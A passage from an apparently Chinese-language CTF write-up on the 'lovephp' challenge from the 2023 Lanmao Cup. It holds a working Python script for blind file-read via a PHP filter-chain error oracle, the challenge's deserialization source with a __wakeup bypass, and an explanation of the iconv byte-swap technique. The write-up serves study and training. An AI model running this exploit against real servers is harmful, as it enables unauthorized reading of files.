class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<span class="hljs-comment"># n-s N-S</span><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<span class="hljs-comment"># n-r</span><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<span class="hljs-keyword">if</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|&#x27;</span> + <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|&#x27;</span>*(n+<span class="hljs-number">1</span>) + <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;rqpon&#x27;</span>[n]<span class="hljs-keyword">break</span><span class="hljs-keyword">else</span>:err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|string.tolower|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<span class="hljs-comment"># N-R</span><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<span class="hljs-keyword">if</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|string.tolower|&#x27;</span> + <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|&#x27;</span>*(n+<span class="hljs-number">1</span>) + <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;RQPON&#x27;</span>[n]<span class="hljs-keyword">break</span><span class="hljs-keyword">else</span>:err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<span class="hljs-comment"># s</span><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;s&#x27;</span><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<span class="hljs-comment"># S</span><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;S&#x27;</span><span class="hljs-keyword">else</span>:err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<span class="hljs-comment"># i j k</span><span class="hljs-keyword">if</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;k&#x27;</span><span class="hljs-keyword">elif</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;j&#x27;</span><span class="hljs-keyword">elif</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;i&#x27;</span><span class="hljs-keyword">else</span>:err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<span class="hljs-comment"># I J K</span><span class="hljs-keyword">if</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;K&#x27;</span><span class="hljs-keyword">elif</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;J&#x27;</span><span class="hljs-keyword">elif</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;I&#x27;</span><span class="hljs-keyword">else</span>:err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<span class="hljs-comment"># v w x</span><span class="hljs-keyword">if</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;x&#x27;</span><span class="hljs-keyword">elif</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;w&#x27;</span><span class="hljs-keyword">elif</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;v&#x27;</span><span class="hljs-keyword">else</span>:err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|string.rot13|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<span class="hljs-comment"># V W X</span><span class="hljs-keyword">if</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|string.rot13|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;X&#x27;</span><span class="hljs-keyword">elif</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|string.rot13|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;W&#x27;</span><span class="hljs-keyword">elif</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|string.rot13|<span class="hljs-subst">&#123;rot1&#125;</span>|string.rot13|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|<span class="hljs-subst">&#123;be&#125;</span>|<span class="hljs-subst">&#123;rot1&#125;</span>|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;V&#x27;</span><span class="hljs-keyword">else</span>:err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|convert.iconv.CP285.CP280|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<span class="hljs-comment"># Z</span><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Z&#x27;</span><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<span class="hljs-comment"># z</span><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;z&#x27;</span><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|convert.iconv.CP285.CP280|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<span class="hljs-comment"># M</span><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;M&#x27;</span><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<span class="hljs-comment"># m</span><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;m&#x27;</span><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|convert.iconv.CP273.CP1122|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<span class="hljs-comment"># y</span><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;y&#x27;</span><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|convert.iconv.CP273.CP1122|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<span class="hljs-comment"># Y</span><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Y&#x27;</span><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<span class="hljs-comment"># l</span><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;l&#x27;</span><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<span class="hljs-comment"># L</span><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;L&#x27;</span><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<span class="hljs-comment"># h</span><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;h&#x27;</span><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<span class="hljs-comment"># H</span><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;H&#x27;</span><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<span class="hljs-comment"># u</span><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;u&#x27;</span><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<span class="hljs-comment"># U</span><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;U&#x27;</span><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|convert.iconv.CP1390.CSIBM932|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<span class="hljs-comment"># g</span><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;g&#x27;</span><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<span class="hljs-comment"># G</span><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;G&#x27;</span><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<span class="hljs-comment"># t</span><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;t&#x27;</span><span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;prefix&#125;</span>|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|<span class="hljs-subst">&#123;blow_up_inf&#125;</span>&#x27;</span>):<span class="hljs-comment"># T</span><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;T&#x27;</span><span class="hljs-keyword">else</span>:err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<span class="hljs-built_in">print</span>()<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):prefix = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;header&#125;</span>|<span class="hljs-subst">&#123;get_nth(i)&#125;</span>&#x27;</span>letter = find_letter(prefix)<span class="hljs-comment"># it&#x27;s a number! check base64</span><span class="hljs-keyword">if</span> letter == <span class="hljs-string">&#x27;*&#x27;</span>:prefix = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;header&#125;</span>|<span class="hljs-subst">&#123;get_nth(i)&#125;</span>|convert.base64-encode&#x27;</span>s = find_letter(prefix)<span class="hljs-keyword">if</span> s == <span class="hljs-string">&#x27;M&#x27;</span>:<span class="hljs-comment"># 0 - 3</span>prefix = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;header&#125;</span>|<span class="hljs-subst">&#123;get_nth(i)&#125;</span>|convert.base64-encode|<span class="hljs-subst">&#123;r2&#125;</span>&#x27;</span>ss = find_letter(prefix)<span class="hljs-keyword">if</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;CDEFGH&#x27;</span>:letter = <span class="hljs-string">&#x27;0&#x27;</span><span class="hljs-keyword">elif</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;STUVWX&#x27;</span>:letter = <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-keyword">elif</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;ijklmn&#x27;</span>:letter = <span class="hljs-string">&#x27;2&#x27;</span><span class="hljs-keyword">elif</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;yz*&#x27;</span>:letter = <span class="hljs-string">&#x27;3&#x27;</span><span class="hljs-keyword">else</span>:err(<span class="hljs-string">f&#x27;bad num (<span class="hljs-subst">&#123;ss&#125;</span>)&#x27;</span>)<span class="hljs-keyword">elif</span> s == <span class="hljs-string">&#x27;N&#x27;</span>:<span class="hljs-comment"># 4 - 7</span>prefix = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;header&#125;</span>|<span class="hljs-subst">&#123;get_nth(i)&#125;</span>|convert.base64-encode|<span class="hljs-subst">&#123;r2&#125;</span>&#x27;</span>ss = find_letter(prefix)<span class="hljs-keyword">if</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;CDEFGH&#x27;</span>:letter = <span class="hljs-string">&#x27;4&#x27;</span><span class="hljs-keyword">elif</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;STUVWX&#x27;</span>:letter = <span class="hljs-string">&#x27;5&#x27;</span><span class="hljs-keyword">elif</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;ijklmn&#x27;</span>:letter = <span class="hljs-string">&#x27;6&#x27;</span><span class="hljs-keyword">elif</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;yz*&#x27;</span>:letter = <span class="hljs-string">&#x27;7&#x27;</span><span class="hljs-keyword">else</span>:err(<span class="hljs-string">f&#x27;bad num (<span class="hljs-subst">&#123;ss&#125;</span>)&#x27;</span>)<span class="hljs-keyword">elif</span> s == <span class="hljs-string">&#x27;O&#x27;</span>:<span class="hljs-comment"># 8 - 9</span>prefix = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;header&#125;</span>|<span class="hljs-subst">&#123;get_nth(i)&#125;</span>|convert.base64-encode|<span class="hljs-subst">&#123;r2&#125;</span>&#x27;</span>ss = find_letter(prefix)<span class="hljs-keyword">if</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;CDEFGH&#x27;</span>:letter = <span class="hljs-string">&#x27;8&#x27;</span><span class="hljs-keyword">elif</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;STUVWX&#x27;</span>:letter = <span class="hljs-string">&#x27;9&#x27;</span><span class="hljs-keyword">else</span>:err(<span class="hljs-string">f&#x27;bad num (<span class="hljs-subst">&#123;ss&#125;</span>)&#x27;</span>)<span class="hljs-keyword">else</span>:err(<span class="hljs-string">&#x27;wtf&#x27;</span>)<span class="hljs-built_in">print</span>(end=letter)o += lettersys.stdout.flush()<span class="hljs-string">&quot;&quot;&quot;</span><span class="hljs-string">We are done!! :)</span><span class="hljs-string">&quot;&quot;&quot;</span><span class="hljs-built_in">print</span>()d = b64decode(o.encode() + <span class="hljs-string">b&#x27;=&#x27;</span> * <span class="hljs-number">4</span>)<span class="hljs-comment"># remove KR padding</span>d = d.replace(<span class="hljs-string">b&#x27;$)C&#x27;</span>,<span class="hljs-string">b&#x27;&#x27;</span>)<span class="hljs-built_in">print</span>(b64decode(d))</code></pre></div><h2 id="2023蓝帽杯lovephp"><a href="#2023蓝帽杯lovephp" class="headerlink" title="2023蓝帽杯lovephp"></a>2023蓝帽杯lovephp</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Saferman</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$check</span> = True;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;check === True)&#123;            <span class="hljs-title function_ invoke__">file</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;secret&#x27;</span>]);        &#125;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-variable language_">$this</span>-&gt;check=False;    &#125;&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;my_secret.flag&#x27;</span>]))&#123;    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;my_secret.flag&#x27;</span>]);&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);&#125;</code></pre></div><p>三处考点</p><p>参数名中的<code>[  </code> <code>. </code> <code>空格 </code> <code> +</code>都会被转化为下划线，但若先出现<code>[</code>后面的<code>.</code> 则不会转化</p><p>php7.4高版本绕过<code>__wakeup</code>魔术方法，使用<code>C:8:&quot;Saferman&quot;:0:&#123;&#125;</code>，C只能执行construct()函数或者destruct()函数，所以就被绕过了</p><p>file()函数是把文件内容放入数组</p><p>这里使用侧信道盲注，使用上一题的脚本，修改为get请求，带上参数即可</p><h2 id="对脚本内容的理解-链接放在最后）"><a href="#对脚本内容的理解-链接放在最后）" class="headerlink" title="对脚本内容的理解(链接放在最后）"></a>对脚本内容的理解(链接放在最后）</h2><h3 id="这部分讲的是脚本原理，可以不看"><a href="#这部分讲的是脚本原理，可以不看" class="headerlink" title="这部分讲的是脚本原理，可以不看"></a>这部分讲的是脚本原理，可以不看</h3><p>我们把侧信道的关键点称为oracle</p><h4 id="Part1-报错"><a href="#Part1-报错" class="headerlink" title="Part1 - 报错"></a>Part1 - 报错</h4><p>想到报错，我们一般是见到页面报错，而此处我们用到的是服务端报错即返回50xHTTP的状态码</p><p>如何找到服务端的oracle呢，脚本作者的方案是使用 <code>php filter</code> 配合 <code>convert.iconv.L1.UCS-4LE</code> 编码，经过多次该编码，达到某一程度就会使php产生内存错误</p><p><img src="/2023/08/29/%E4%BB%8Elovephp%E7%9C%8B%E4%BE%A7%E4%BF%A1%E9%81%93/image-20230830185630646.png" alt="image-20230830185630646"></p><p>产生错误之后，我们想能不能找到一种带判断的编码，并且经过判断后能够使产生报错的代码不再报错，通过这样盲注获取信息</p><p>脚本作者在<a href="https://github.com/php/php-src/blob/01b3fc03c30c6cb85038250bb5640be3a09c6a32/ext/standard/filters.c#L1724">php filter dechunk</a> 部分发现，其对于字符的处理存在一个范围限制，只检查第一个字符是否在<code>a-fA-f0-9</code> 这个范围内，若是则输出空，若不是则输出原字符串</p><p><img src="/2023/08/29/%E4%BB%8Elovephp%E7%9C%8B%E4%BE%A7%E4%BF%A1%E9%81%93/image-20230830191100214.png" alt="image-20230830191100214"></p><p>因此我们可以对字符串的第一个字符进行判断</p><p>这里给出参考文章的作者给出的案例，蓝色框和红色框对比是为了测出产生内存错误的临界情况（不同机器对于php产生内存错误的长度不同），红色框和绿色框对比用来判断第一个字符是否在范围内</p><p>但此处我有点疑惑，明明第一个字符是<code>U</code>（多加一次编码我测试的首字符是不变的）为什么能够通过检查，输出空字符串   （希望能够解答一下）</p><p><img src="/2023/08/29/%E4%BB%8Elovephp%E7%9C%8B%E4%BE%A7%E4%BF%A1%E9%81%93/image-20230830191805947.png" alt="image-20230830191805947"></p><h3 id="Part2-交换字符"><a href="#Part2-交换字符" class="headerlink" title="Part2-交换字符"></a>Part2-交换字符</h3><p>由于dechunk只能对第一个字符做判断，于是想能不能找到交换字符顺序的编码形式</p><p>下面我们用<code>abcdefgh</code>八字节举例</p><p>使用 <code>convert.iconv.CSUNICODE.UCS-2BE</code> 我们可以前后交换每两个字节的位置，我们称这个编码规则为 <code>r2</code> </p><div class="code-wrapper"><pre><code class="hljs isbl"><span class="hljs-variable">php</span> &gt; <span class="hljs-function"><span class="hljs-title">var_dump</span>(<span class="hljs-title">file_get_contents</span>(<span class="hljs-string">&quot;php://filter/convert.iconv.CSUNICODE.UCS-2BE/resource=data:,abcdefgh&quot;</span>));</span><span class="hljs-function"><span class="hljs-title">string</span>(<span class="hljs-number">6</span>) <span class="hljs-string">&quot;badcfehg&quot;</span></span></code></pre></div><p>使用 <code>convert.iconv.UCS-4LE.10646-1:1993</code> 我们可以将每四个字节的位置逆序，我们称这个编码规则为 <code>r4</code> </p><div class="code-wrapper"><pre><code class="hljs isbl"><span class="hljs-variable">php</span> &gt; <span class="hljs-function"><span class="hljs-title">var_dump</span>(<span class="hljs-title">file_get_contents</span>(<span class="hljs-string">&quot;php://filter/convert.iconv.UCS-4LE.10646-1:1993/resource=data:,abcdefgh&quot;</span>));</span><span class="hljs-function"><span class="hljs-title">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;dcbahgfe&quot;</span></span></code></pre></div><p>第三位想要放到第一个，先经过r2，再经过一次r4即可</p><p>于是前半段我们都可以进行判断，但后半段我们没法利用r2和r4提到前面去</p><p>这里需要利用php在处理base64字符串会忽略非法字符。令字符串前面出现非法字符，然后利用交换规则，执行base64-decode，非法字符就被删除，后面字符就换到了前面去</p><div class="code-wrapper"><pre><code class="hljs reasonml">##参考文章作者给出的例子<span class="hljs-comment">// 产生填充字符</span>php &gt; var<span class="hljs-constructor">_dump(<span class="hljs-params">file_get_contents</span>(<span class="hljs-string">&quot;php://filter/convert.iconv.CSUNICODE.CSUNICODE/resource=data:,abcdef&quot;</span>)</span>);<span class="hljs-built_in">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;��abcdef&quot;</span><span class="hljs-comment">// 使用 r4 进行移位</span>php &gt; var<span class="hljs-constructor">_dump(<span class="hljs-params">file_get_contents</span>(<span 